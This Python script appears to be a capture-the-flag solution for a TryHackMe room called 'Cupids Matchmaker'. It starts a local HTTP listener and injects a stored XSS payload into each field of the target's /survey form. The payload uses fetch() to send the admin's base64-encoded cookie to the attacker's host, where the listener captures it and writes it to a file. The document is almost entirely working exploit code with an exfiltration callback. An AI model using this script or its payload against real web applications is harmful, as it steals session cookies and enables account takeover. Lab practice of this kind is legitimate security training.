#!/usr/bin/env python3
"""
Stored XSS exfil de cookie del admin -> THM Cupids Matchmaker.

Levanta http.server en :8000 y postea XSS en cada campo del /survey.
"""

import http.server
import socketserver
import threading
import time

import requests

LISTEN_PORT = 8000
TARGET = "http://10.64.164.194:5000"
# IP accesible desde el target (tun0 /18)
ATTACKER_IP = "192.168.134.200"

PAYLOAD = (
    f'<script>fetch("http://{ATTACKER_IP}:{LISTEN_PORT}/?cookie=" '
    '+ btoa(document.cookie));</script>'
)

XSS_FIELDS = [
    "name",
    "ideal_date",
    "describe_yourself",
    "looking_for",
    "dealbreakers",
]


class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print("[hit] %s - %s" % (self.client_address[0], fmt % args))

    def do_GET(self):
        if "?cookie=" in self.path:
            import base64
            from urllib.parse import unquote, urlparse, parse_qs

            qs = parse_qs(urlparse(self.path).query)
            cookie_b64 = qs.get("cookie", [""])[0]
            try:
                decoded = base64.b64decode(cookie_b64 + "=").decode(errors="replace")
            except Exception as e:
                decoded = f"<decode error: {e}> raw={cookie_b64}"
            print("\n[+] COOKIE EXFILTRADA:", decoded, flush=True)
            with open("/tmp/xss/flag.txt", "w") as f:
                f.write(decoded)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            return
        super().do_GET(self)


def serve():
    with socketserver.TCPServer(("0.0.0.0", LISTEN_PORT), Handler) as httpd:
        httpd.serve_forever()


def submit_xss():
    data = {
        "name": PAYLOAD,
        "age": "25",
        "gender": "Male",
        "seeking": "Female",
        "ideal_date": PAYLOAD,
        "describe_yourself": PAYLOAD,
        "looking_for": PAYLOAD,
        "dealbreakers": PAYLOAD,
    }
    r = requests.post(f"{TARGET}/survey", data=data, timeout=30)
    print("[*] survey POST:", r.status_code, r.headers.get("Location"))


if __name__ == "__main__":
    t = threading.Thread(target=serve, daemon=True)
    t.start()
    print(f"[*] listening on :{LISTEN_PORT}")
    submit_xss()
    print("[*] esperando callback del admin (hasta 2 min)...")
    time.sleep(120)
    try:
        print(open("/tmp/xss/flag.txt").read())
    except FileNotFoundError:
        print("[-] sin exfil")